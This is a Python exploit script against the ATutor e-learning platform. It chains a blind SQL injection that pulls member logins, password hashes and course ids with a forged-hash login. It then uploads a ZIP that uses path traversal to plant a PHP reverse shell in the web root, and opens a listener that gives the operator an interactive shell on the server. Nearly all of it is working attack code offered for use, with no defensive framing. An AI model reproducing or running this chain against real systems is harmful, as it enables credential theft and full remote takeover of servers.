#!/usr/bin/python3
import hashlib, sys, zipfile, threading, socket, time
import requests as r
import itertools as it
from io import BytesIO

### Predefined values:
upcase = range(65, 91)
lowcase = range(97, 123)
nums = range(48, 58)
spchars = it.chain(range(32, 48), range(58, 65), range(123,127))

db_name=""

### Detect the length of the DB (This is just for test, you can enumerate version, user or db name)
def enumlen(component, rhost, rport):
    global comp_len
    for i in range(1, 50):
        if r.get("http://{}:{}/ATutor/mods/_standard/social/index_public.php?q=AAAA%27)/**/or/**/(select/**/LENGTH({}()))={}%23".format(rhost,rport,component,i)).text != "":
            print("(+) Enumerating {} length: {} - SUCCESS".format(component,i), end='\r')
            sys.stdout.write("\033[K")
            comp_len=i
            break
        else:
            print("(+) Enumerating {} length: ".format(component)+str(i), end='\r')
            sys.stdout.write("\033[K")
    print("(+) Found {} length: {}".format(component,comp_len))

### Enumerate content of component (This is just for test, you can enumerate version, user or db name)
def enumname(component, rhost, rport):
    global comp_name
    comp_name=""
    for z in range(1, comp_len+1):
        for i in it.chain(lowcase, upcase, nums, spchars):
            if r.get("http://{}:{}/ATutor/mods/_standard/social/index_public.php?q=AAAA%27)/**/or/**/(select/**/substring({}(),{},1))='{}'%23".format(rhost,rport,component,z,chr(i))).text != "":
                print("(+) Enumerating {} name: ".format(component)+comp_name+"["+chr(i)+"]", end='\r')
                sys.stdout.write("\033[K")
                comp_name = comp_name+chr(i)
                break
            else:
                print("(+) Enumerating {} name: ".format(component)+comp_name+"["+chr(i)+"]", end='\r')
                sys.stdout.write("\033[K")
    print("(+) Found {} name: ".format(component)+comp_name)


## Enumerate selected table with selected column
def enumcolumn(component,rhost,rport,table):
    global comp_len
    for i in range(1, 50):
        if r.get("http://{}:{}/ATutor/mods/_standard/social/index_public.php?q=AAAA%27)/**/or/**/(select/**/LENGTH({})={}/**/FROM/**/{})%23".format(rhost,rport,component,i,table)).text != "":
            print("(+) Enumerating {} length: {} - SUCCESS".format(component,i), end='\r')
            sys.stdout.write("\033[K")
            comp_len=i
            break
        else:
            print("(+) Enumerating {} length: ".format(component)+str(i), end='\r')
            sys.stdout.write("\033[K")
    print("(+) Found {} length: {}".format(component,comp_len))
    comp_name=""
    for z in range(1, comp_len+1):
        for i in it.chain(nums, lowcase, upcase, spchars):
            if r.get("http://{}:{}/ATutor/mods/_standard/social/index_public.php?q=AAAA%27)/**/or/**/(select/**/substring({},{},1)='{}'/**/FROM/**/{})%23".format(rhost,rport,component,z,chr(i),table)).text != "":
                print("(+) Enumerating {} value: ".format(component)+comp_name+"["+chr(i)+"]", end='\r')
                sys.stdout.write("\033[K")
                comp_name = comp_name+chr(i)
                break
            else:
                print("(+) Enumerating {} value: ".format(component)+comp_name+"["+chr(i)+"]", end='\r')
                sys.stdout.write("\033[K")
    print("(+) Found {} value: ".format(component)+comp_name)
    return comp_name

## This is just reverse shell listener
def listen(ip,port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((ip, int(port)))
    s.listen(1)
    print("[+] Reverse shell listening on port " + str(port))
    conn, addr = s.accept()
    print('[+] Connection received from ',addr)
    while True:
        #Receive data from the target and get user input
        ans = conn.recv(1024).decode()
        sys.stdout.write(ans)
        command = input()

        #Send command
        command += "\n"
        conn.send(command.encode())
        time.sleep(1)

        #Remove the output of the "input()" function
        sys.stdout.write("\033[A" + ans.split("\n")[-1])

## Building malicious ZIP file
def build_zip():
    f = BytesIO()
    z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
    z.writestr('../../../../../../var/www/html/ATutor/mods/shell/shell.phtml', '''
<?php
set_time_limit (0);
$VERSION = "1.0";
$ip = "{}";
$port = {};
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {{
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {{
		printit("ERROR: Can't fork");
		exit(1);
	}}
	
	if ($pid) {{
		exit(0);  // Parent exits
	}}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {{
		printit("Error: Can't setsid()");
		exit(1);
	}}

	$daemon = 1;
}} else {{
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {{
	printit("$errstr ($errno)");
	exit(1);
}}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {{
	printit("ERROR: Can't spawn shell");
	exit(1);
}}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {{
	// Check for end of TCP connection
	if (feof($sock)) {{
		printit("ERROR: Shell connection terminated");
		break;
	}}

	// Check for end of STDOUT
	if (feof($pipes[1])) {{
		printit("ERROR: Shell process terminated");
		break;
	}}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {{
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {{
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {{
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}}
}}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);


function printit ($string) {{
	if (!$daemon) {{
		print "$string\n";
	}}
}}

?> '''.format(lhost,lport))
    z.writestr('imsmanifest.xml', 'invalid xml!')
    z.close()
    return f.getvalue()
if __name__ == "__main__":
   if len(sys.argv) != 5:
       print("(+) usage: {} <RHOST> <RPORT> <LHOST> <LPORT>\n".format(sys.argv[0]))
       print("(+) RHOST - Remote server which runs vulnerable version of ATutor")
       print("(+) RPORT - Remote web-server port")
       print("(+) LHOST - Local IP Address to get shell")
       print("(+) LPORT - Local Port to get shell\n")
       sys.exit(-1)
   rhost = sys.argv[1]
   rport = sys.argv[2]
   lhost = sys.argv[3]
   lport = sys.argv[4]
   print("[+] For the preparation of the main atttack, gathering required info through blind sqli:")
   username = enumcolumn("login",rhost,rport,"AT_members")
   passhash = hashlib.sha1(bytes("{}123".format(enumcolumn("password",rhost,rport,"AT_members")), encoding='utf8')).hexdigest()
   courseid = enumcolumn("course_id", rhost, rport, "AT_courses")
   print("[+] Starting the attack! Logging into remote application:")
   rtest=r.post("http://{}:{}/ATutor/login.php".format(rhost,rport), data={"form_login_action":"true","form_course_id":"0","form_password_hidden":"{}".format(passhash),"token":"123","p":"","form_login":username,"form_password":"","submit":"Login"}, headers={"User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"})#, allow_redirects=False)
   for c in rtest.cookies:
        cookie = c.value
   print("[+] Login successfull! Session cookie: {}".format(cookie))
   bounceme=r.get("http://{}:{}/ATutor/bounce.php?course={}&p=index.php".format(rhost,rport,courseid), headers={"User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0", "Cookie":"ATutorID={}".format(cookie)})
   for c in bounceme.cookies:
        cookie = c.value
   print("[+] Bounced using the course-id {}, new session cookie: {}".format(courseid, cookie))
   fileobj = build_zip()
   print("[+] Malicious zip is ready! Firing the cannon!")
   upload = r.post("http://{}:{}/ATutor/mods/_standard/tests/import_test.php".format(rhost,rport), headers={"User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0", "Cookie":"ATutorID={}".format(cookie)}, data = {"submit_import":"Import"}, files={"file": ("test.zip", fileobj)})
   print("[+] Yuuhu, the best response you can ever see: '{}'".format(upload.text))
   listener_thread = threading.Thread(target=listen, args=(lhost, lport))
   listener_thread.start()
   r.get("http://{}:{}/ATutor/mods/shell/shell.phtml".format(rhost,rport))
   listener_thread.join()
